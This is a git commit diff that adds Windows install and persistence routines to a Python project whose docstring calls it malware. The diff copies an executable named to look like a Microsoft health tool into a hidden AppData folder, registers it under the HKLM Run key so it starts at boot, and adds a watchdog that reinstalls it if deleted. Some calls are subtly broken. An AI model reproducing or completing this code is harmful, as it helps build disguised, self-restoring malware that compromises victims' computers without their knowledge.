1f2afd7ce1dd144ee68bd5403f518d4304e7ced7
schubar <snorccrafter@gmail.com>
2022-05-24 09:52:19 +0700

    ic upd 1.6 to ic 1.7 24/05

--- source/bin/configuration.py
+++ source/bin/configuration.py
@@ -1,3 +1,6 @@
+import winreg
+
+
 class Settings:
     WINDOWS_APPLICATION_NAME = "MicrosoftHealthToolset"
     WINDOWS_APPLICATION_HOME = "%AppData%\\Microsoft\\Spelling\\"
@@ -5,4 +8,5 @@ class Settings:
     WINDOWS_ATTACK = f"{WINDOWS_FULL_PATH} --run"
 
     WINDOWS_WINREG_DIR = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    WINREG_KEY_PATH = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINDOWS_WINREG_DIR)
     WINDOWS_WINREG_NAME = f"{WINDOWS_APPLICATION_NAME}"
--- source/bin/install.py
+++ source/bin/install.py
@@ -1,28 +1,47 @@
 import winreg
 import os
 import sys
+from bin.configuration import Settings
+
+
 
 
 class Installer:
-    def __init__(self, os_family):
+    def __init__(self, os_family, ext=None):
         """
         Install malware in system
         :param os_family:
         """
         if os_family == "win32":
-            self.install_winnt()
+            self.install_win32()
         if os_family == "darwin":
             self.install_osx()
         else:
             self.install_linux()
 
-    def install_winnt(self):
-        pass
+    def install_win32(self, ext):
+        """
+
+        :param ext:
+        :return:
+        """
+        os.system(f"COPY .\\{Settings.WINDOWS_APPLICATION_NAME}.exe {Settings.WINDOWS_FULL_PATH}")
+        winreg.SetValue(Settings.WINREG_KEY_PATH, Settings.WINDOWS_WINREG_NAME,
+                        winreg.REG_QWORD, Settings.WINDOWS_FULL_PATH
+                        )
 
     def install_osx(self):
+        """
+
+        :return:
+        """
         pass
 
     def install_linux(self):
+        """
+
+        :return:
+        """
         pass
 
 
@@ -33,12 +52,13 @@ class KeeperCheck:
         :param os_family:
         """
         if os_family == "win32":
-            self.check_winnt()
+            self.check_win32()
         else:
             self.check_unix()
 
-    def check_winnt(self):
-        pass
+    def check_win32(self):
+        if not os.path.exists(f"{Settings.WINDOWS_FULL_PATH}"):
+            Installer.install_win32()
 
     def check_unix(self):
         pass
